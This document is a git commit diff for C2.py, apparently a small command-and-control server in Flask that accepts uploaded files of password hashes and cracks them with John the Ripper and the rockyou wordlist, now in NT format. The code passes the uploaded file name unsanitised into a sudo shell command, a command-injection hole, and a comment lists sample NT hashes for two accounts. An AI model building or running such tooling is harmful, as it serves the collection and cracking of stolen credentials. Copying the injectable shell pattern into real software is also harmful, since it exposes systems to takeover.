7d57f202c0258fb2d2f3523aef9805062b54f5f8
KAH HOWE WOO <46815334+JustAyce@users.noreply.github.com>
2022-10-22 12:33:36 +0800

    Update C2.py

--- C2.py
+++ C2.py
@@ -3,7 +3,7 @@ import subprocess
 from flask import render_template
 from flask import Flask, flash, redirect, request
 
-UPLOAD_FOLDER = '/home/kali/Desktop'
+UPLOAD_FOLDER = '/home/kali/'
 app = Flask(__name__)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
@@ -16,8 +16,9 @@ def upload():
 
         file = request.files['file']
         if file:
-            file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
-            if os.stat(os.path.join(app.config['UPLOAD_FOLDER'], file.filename)).st_size != 0:
+            f = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
+            file.save(f)
+            if os.stat(f).st_size != 0:
                 print('yep')
                 crack_hash(f)
                 return ('nice')
@@ -26,10 +27,19 @@ def upload():
     return ('upload.html')
 
 def crack_hash(f):
-    command = "sudo john --format=LM --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt > cracked.txt"
+    command = "sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt "+f+" > cracked.txt"
     proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
     print(proc.pid)
     return True
 
+"""
+~/hash.txt
+vagrant:e02bc503339d51f71d913c245d35b50b
+user2:c549ee84021e5e8372e10cedeafd02a8
+
+~/wordlist.txt
+vagrant
+user2
+"""
 if __name__ == '__main__':
     app.run()
